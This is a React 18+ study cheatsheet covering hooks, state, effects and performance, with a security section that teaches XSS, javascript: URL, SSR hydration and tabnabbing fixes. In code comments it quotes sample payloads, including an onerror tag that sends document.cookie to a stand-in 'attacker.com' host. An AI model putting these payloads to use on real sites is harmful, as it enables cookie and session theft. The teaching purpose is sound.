# ⚛️ React 18+ — Complete Revision & Security Cheatsheet

> 🎯 **Goal:** Master modern React fundamentals, state management, escape hatches, hooks, component patterns, and security best practices in a single comprehensive reference guide based on [react.dev](https://react.dev/learn).

---

## 📋 Table of Contents

1. [React Fundamentals & JSX Rules](#1-react-fundamentals--jsx-rules)
2. [Describing the UI & Component Architecture](#2-describing-the-ui--component-architecture)
3. [Adding Interactivity & State Management](#3-adding-interactivity--state-management)
4. [Managing State & Reducers](#4-managing-state--reducers)
5. [Escape Hatches & Ref Engine](#5-escape-hatches--ref-engine)
6. [Effects & Synchronizing with External Systems](#6-effects--synchronizing-with-external-systems)
7. [React Custom Hooks Engine](#7-react-custom-hooks-engine)
8. [Performance Optimization Architecture](#8-performance-optimization-architecture)
9. [React Security Cheatsheet & Vulnerabilities](#9-react-security-cheatsheet--vulnerabilities)
10. [60-Second Revision & Rapid-Fire Q&A](#10-60-second-revision--rapid-fire-qa)

---

# 1. React Fundamentals & JSX Rules

React is a JavaScript library for building user interfaces out of individual pieces called **components**.

## 🧒 Explain Like I'm 10

Imagine playing with LEGO blocks. Each block is a **Component**. You can build a small house (a button) or combine many blocks to build a castle (a full Web App). If one block changes color, you don't rebuild the entire castle—React just updates that single block.

## Key Principles

- **Declarative**: Describe _what_ the UI should look like based on state, not _how_ to step-by-step manipulate DOM nodes.
- **Component-Based**: Encapsulate code and layout into isolated, re-usable blocks.
- **Single Direction Data Flow**: Data flows down from parent components to child components via `props`.

---

## JSX (JavaScript XML) Rules

JSX is a syntax extension for JavaScript that lets you write HTML-like markup inside a JavaScript file.

1. **Return a single root element**: Wrap siblings in a single parent tag or a Fragment (`<>...</>`).
2. **Close all tags**: Self-closing tags must end with `/` (e.g., `<img />`, `<br />`).
3. **CamelCase attributes**: Use `className` instead of `class`, `htmlFor` instead of `for`, `onClick` instead of `onclick`.

```jsx
// Correct JSX Syntax
export default function Profile() {
  return (
    <>
      <h1 className="title">User Profile</h1>
      <img
        src="https://i.imgur.com/7vQD0fPs.jpg"
        alt="Avatar"
        className="avatar"
      />
    </>
  );
}
```

---

## 2. Describing the UI & Component Architecture

### Props (Properties)

Props are the inputs passed to React components. Props are read-only (immutable snapshots in time).

```jsx
function Avatar({ person, size = 100 }) {
  // Default prop values
  return (
    <img
      src={`https://i.imgur.com/${person.imageId}.jpg`}
      alt={person.name}
      width={size}
      height={size}
    />
  );
}
```

### Conditional Rendering

Use JavaScript control flow (if, &&, ternary ? :) to render UI conditionally.

```jsx
function Item({ name, isPacked }) {
  return (
    <li className="item">
      {/* Logical && Pattern */}
      {name} {isPacked && "✅"}
      {/* Ternary Operator Pattern */}
      {/* {isPacked ? <del>{name + ' ✅'}</del> : name} */}
    </li>
  );
}
```

**⚠️ Gotcha:** Avoid placing numbers on the left side of `&&`. Example: `coins && <List />` will render `0` on screen when coins is 0. Use `coins > 0 && <List />` instead.

### Rendering Lists & Keys

Always assign a unique and stable key string/number to list items when dynamically generating sibling elements.

```jsx
const people = [
  { id: "0", name: "Ada Lovelace" },
  { id: "1", name: "Alan Turing" },
];

function List() {
  const listItems = people.map((person) => (
    <li key={person.id}>
      <p>{person.name}</p>
    </li>
  ));
  return <ul>{listItems}</ul>;
}
```

**🛑 Key Rule:** Never use array indices (`key={index}`) if array items can reorder, insert, or delete. Never generate keys on the fly like `key={Math.random()}`.

---

## 3. Adding Interactivity & State Management

### Event Handlers

Event handlers are custom functions triggered by user interactions (clicking, typing, focusing).

```jsx
function Button() {
  function handleClick(e) {
    e.stopPropagation(); // Prevents event bubbling up parent components
    e.preventDefault(); // Prevents browser default form submission
    alert("Clicked!");
  }

  return <button onClick={handleClick}>Click Me</button>; // Pass, don't call!
}
```

### Component Memory: useState

State holds data that changes over time and triggers re-renders.

```jsx
import { useState } from "react";

function Counter() {
  const [index, setIndex] = useState(0);

  function handleClick() {
    // Updater function syntax for batched/queued state updates
    setIndex((prevIndex) => prevIndex + 1);
  }

  return <button onClick={handleClick}>Count: {index}</button>;
}
```

### State Snapshot & Batching

Setting state does not mutate the current variable in existing running code; it requests a new render with a new state value.

React batches state updates inside event handlers to prevent multi-render lag.

```jsx
function FixCounter() {
  const [number, setNumber] = useState(0);

  function handleBatch() {
    setNumber(number + 1); // 0 + 1
    setNumber(number + 1); // 0 + 1
    setNumber(number + 1); // 0 + 1
    // Final state value after re-render: 1!

    // To queue multiple updates, pass an updater function:
    // setNumber(n => n + 1);
    // setNumber(n => n + 1);
    // setNumber(n => n + 1);
    // Final state value after re-render: 3!
  }
}
```

### Mutating State Variables (Immutability)

Treat state as read-only. Always copy objects/arrays before setting state.

```jsx
// Immutable Object Updates
const [user, setUser] = useState({ name: "Alice", score: 10 });

setUser({
  ...user,
  score: user.score + 1, // Override target property
});

// Immutable Array Updates
const [items, setItems] = useState(["A", "B"]);

// Add item
setItems([...items, "C"]);

// Remove item
setItems(items.filter((item) => item !== "A"));

// Transform item
setItems(items.map((item) => (item === "B" ? "Updated B" : item)));
```

---

## 4. Managing State & Reducers

### Consolidating State Logic: useReducer

When complex component state involves multiple sub-values or actions, replace `useState` with `useReducer`.

```jsx
import { useReducer } from "react";

function tasksReducer(tasks, action) {
  switch (action.type) {
    case "added": {
      return [...tasks, { id: action.id, text: action.text, done: false }];
    }
    case "deleted": {
      return tasks.filter((t) => t.id !== action.id);
    }
    default: {
      throw Error("Unknown action: " + action.type);
    }
  }
}

export default function TaskApp() {
  const [tasks, dispatch] = useReducer(tasksReducer, initialTasks);

  function handleAddTask(text) {
    dispatch({ type: "added", id: Date.now(), text: text });
  }
}
```

### Passing Data Deeply: useContext

Context allows a parent component to make information available to any component in the tree below it, no matter how deep, without passing props explicitly (Prop Drilling avoidance).

```jsx
import { createContext, useContext, useState } from "react";

// 1. Create Context
const ThemeContext = createContext("light");

export default function App() {
  const [theme, setTheme] = useState("dark");

  return (
    // 2. Provide Context
    <ThemeContext.Provider value={theme}>
      <Form />
    </ThemeContext.Provider>
  );
}

function Form() {
  // 3. Consume Context
  const theme = useContext(ThemeContext);
  return <div className={`theme-${theme}`}>Active Theme: {theme}</div>;
}
```

---

## 5. Escape Hatches & Ref Engine

### Referencing Values with useRef

When a component needs to remember some information, but that information should not trigger new renders, use a ref.

```jsx
import { useRef } from "react";

export default function Timer() {
  const intervalRef = useRef(null); // Returns { current: initialValue }

  function handleStart() {
    intervalRef.current = setInterval(() => {
      console.log("Tick");
    }, 1000);
  }

  function handleStop() {
    clearInterval(intervalRef.current);
  }
}
```

### Differences: useState vs useRef

| Feature            | useState                   | useRef                                |
| ------------------ | -------------------------- | ------------------------------------- |
| **Returns**        | `[value, setter]` tuple    | `{ current: value }` object           |
| **Re-renders UI?** | ✅ Yes, triggers re-render | ❌ No, updating does not render       |
| **Mutable?**       | ❌ Immutable (use setter)  | ✅ Mutable (`ref.current = newValue`) |
| **Usage**          | UI Data, state sync        | DOM nodes, timers, non-rendered state |

### Manipulating DOM with Refs

```jsx
import { useRef } from "react";

export default function Form() {
  const inputRef = useRef(null);

  function handleClick() {
    // Direct DOM API Access
    inputRef.current.focus();
  }

  return (
    <>
      <input ref={inputRef} />
      <button onClick={handleClick}>Focus Input</button>
    </>
  );
}
```

---

## 6. Effects & Synchronizing with External Systems

### What are Effects?

Effects let you run code after rendering so that you can synchronize your component with systems outside of React (APIs, browser DOM, WebSocket connections).

**⚠️ Key Rule:** Effects are an escape hatch. Do not use Effects to transform data for rendering or to handle user interactions that belong in event handlers.

```jsx
import { useEffect, useState } from "react";

function VideoPlayer({ src, isPlaying }) {
  const ref = useRef(null);

  useEffect(() => {
    if (isPlaying) {
      ref.current.play();
    } else {
      ref.current.pause();
    }
  }, [isPlaying]); // Dependency Array controls execution

  return <video ref={ref} src={src} />;
}
```

### Dependency Array Options

```jsx
// Runs after EVERY render
useEffect(() => {
  // ...
});

// Runs ONLY ONCE after component mounts
useEffect(() => {
  // ...
}, []);

// Runs on mount AND if 'a' or 'b' changed since last render
useEffect(() => {
  // ...
}, [a, b]);
```

### Cleaning Up Effects

If your Effect connects to something (WebSockets, Event Listeners, Intervals), return a cleanup function to teardown resources when unmounting or re-running.

```jsx
useEffect(() => {
  const connection = createConnection(serverUrl, roomId);
  connection.connect();

  // Cleanup Function
  return () => {
    connection.disconnect();
  };
}, [serverUrl, roomId]);
```

---

## 7. React Custom Hooks Engine

Custom Hooks allow sharing stateful logic—not state itself—between components. Custom Hook names must start with `use`.

```jsx
import { useState, useEffect } from "react";

// Custom Hook definition
function useOnlineStatus() {
  const [isOnline, setIsOnline] = useState(navigator.onLine);

  useEffect(() => {
    function handleOnline() {
      setIsOnline(true);
    }
    function handleOffline() {
      setIsOnline(false);
    }

    window.addEventListener("online", handleOnline);
    window.addEventListener("offline", handleOffline);

    return () => {
      window.removeEventListener("online", handleOnline);
      window.removeEventListener("offline", handleOffline);
    };
  }, []);

  return isOnline;
}

// Usage inside component
export default function StatusBar() {
  const isOnline = useOnlineStatus();
  return <h1>{isOnline ? "✅ Online" : "❌ Disconnected"}</h1>;
}
```

---

## 8. Performance Optimization Architecture

React relies on virtual DOM diffing. Use these APIs to optimize costly computations and unneeded child re-renders.

### useMemo

Caches the result of a calculation between renders.

```jsx
import { useMemo } from "react";

function TodoList({ todos, filter }) {
  // Recalculates only when 'todos' or 'filter' changes
  const visibleTodos = useMemo(() => {
    return calculateExpensiveFilter(todos, filter);
  }, [todos, filter]);

  return (
    <ul>
      {visibleTodos.map((todo) => (
        <li key={todo.id}>{todo.text}</li>
      ))}
    </ul>
  );
}
```

### useCallback

Caches a function definition between renders.

```jsx
import { useCallback } from "react";

function ProductPage({ productId, referrer }) {
  // Prevents recreation of handleSubmit reference on every render
  const handleSubmit = useCallback(
    (orderDetails) => {
      post("/product/" + productId + "/buy", {
        referrer,
        orderDetails,
      });
    },
    [productId, referrer],
  );

  return <Form onSubmit={handleSubmit} />;
}
```

---

## 9. React Security Cheatsheet & Vulnerabilities

React provides built-in safety controls, but specific developer coding patterns can introduce catastrophic client-side security risks.

### 1. Cross-Site Scripting (XSS) via Unsanitized Markup

#### Vulnerability Concept

Using `dangerouslySetInnerHTML` bypasses React's default auto-escaping and allows arbitrary script injection execution.

#### Vulnerable Code

```jsx
// 🚨 VULNERABLE TO XSS
function UserBio({ userComment }) {
  // If userComment contains: <img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)" />
  return <div dangerouslySetInnerHTML={{ __html: userComment }} />;
}
```

#### Secure Remediation

Avoid HTML injection. If required, sanitize user content strictly using libraries like DOMPurify.

```jsx
// 🔒 SECURE
import DOMPurify from "dompurify";

function UserBio({ userComment }) {
  const cleanHTML = DOMPurify.sanitize(userComment);
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}
```

### 2. Insecure Script/URL Injections

#### Vulnerability Concept

User-controlled URLs supplied to `href` or `src` attributes using `javascript:` protocol can trigger script execution upon user interaction.

#### Vulnerable Code

```jsx
// 🚨 VULNERABLE
function UserLink({ websiteUrl }) {
  // If websiteUrl is: "javascript:alert(document.cookie)"
  return <a href={websiteUrl}>Visit Profile</a>;
}
```

#### Secure Remediation

Validate protocol prefixes before passing URLs to DOM attributes.

```jsx
// 🔒 SECURE
function UserLink({ websiteUrl }) {
  const isSafe =
    websiteUrl.startsWith("http://") || websiteUrl.startsWith("https://");
  const safeUrl = isSafe ? websiteUrl : "#";

  return (
    <a href={safeUrl} rel="noopener noreferrer">
      Visit Profile
    </a>
  );
}
```

### 3. Server-Side Rendering (SSR) Hydration Data Leakage

#### Vulnerability Concept

Embedding unsanitized initial state into HTML `<script>` tags for client hydration allows attackers to inject scripts via JSON payload modification.

#### Vulnerable Code

```jsx
// 🚨 VULNERABLE SSR HTML TEMPLATE
function renderHTML(initialState) {
  return `
    <script>
      window.__INITIAL_STATE__ = ${JSON.stringify(initialState)};
    </script>
  `;
}
```

#### Secure Remediation

Sanitize `<` characters and stringify using serialization utilities like `serialize-javascript`.

```jsx
// 🔒 SECURE
import serialize from "serialize-javascript";

function renderHTML(initialState) {
  return `
    <script>
      window.__INITIAL_STATE__ = ${serialize(initialState, { isJSON: true })};
    </script>
  `;
}
```

### 4. Reverse Tabnabbing Vulnerability

#### Vulnerability Concept

Opening external links with `target="_blank"` allows target pages to control `window.opener` and redirect the original application page to a phishing payload.

#### Remediation Pattern

```jsx
// 🔒 SECURE
<a href="https://external-site.com" target="_blank" rel="noopener noreferrer">
  External Portal
</a>
```

---

## 10. 60-Second Revision & Rapid-Fire Q&A

### 🔄 Execution Pipeline

```
Component Trigger (Initial / State Change)
            │
            ▼
React Renders Component Trees (Virtual DOM Computation)
            │
            ▼
React Commits Changes to DOM Nodes
            │
            ▼
Browser Paints Screen
            │
            ▼
useEffect Cleanup / Effect Execution Runs
```

### 🧠 60-Second Cheat Summary

| Concept        | One-Line Summary                                                               |
| -------------- | ------------------------------------------------------------------------------ |
| **JSX**        | Syntax extension that produces React elements; must return single parent.      |
| **Props**      | Immutable read-only inputs passed from parent to child.                        |
| **State**      | Component memory; setting it queues a re-render.                               |
| **Keys**       | Stable, unique identifiers that help React identify list items during diffing. |
| **useRef**     | Store mutable values without triggering component re-renders.                  |
| **useEffect**  | Synchronize component state with external non-React systems.                   |
| **useReducer** | Extract complex state update logic outside components into single function.    |
| **useContext** | Broadly broadcast props down the component tree without prop-drilling.         |

### 💼 Rapid-Fire Interview Questions

**Q1. What is the difference between Virtual DOM and Real DOM?**

A: The Virtual DOM is a lightweight, in-memory representation of the actual DOM elements. React uses it to calculate minimal DOM manipulation diffs via reconciliation before applying updates efficiently to the real DOM.

**Q2. Why shouldn't you mutate state directly in React?**

A: Direct state mutation (`state.a = 5`) does not notify React that state changed. State must be updated using setter functions (`setState`) or reducers to trigger component re-rendering cycles.

**Q3. Why do Hooks need to be called at the top level of a component?**

A: React relies on the order in which Hooks are called across renders to preserve state across calls. Placing Hooks inside conditions or loops breaks the array indexing order React uses internally.

**Q4. What causes infinite re-renders with useEffect?**

A: Updating a state variable inside `useEffect` without specifying a dependency array, or including that updated state variable inside the dependency array itself.

**Q5. What is the difference between useMemo and useCallback?**

A: `useMemo` caches the result of executing a calculation/function, while `useCallback` caches the function instance itself.

```

```
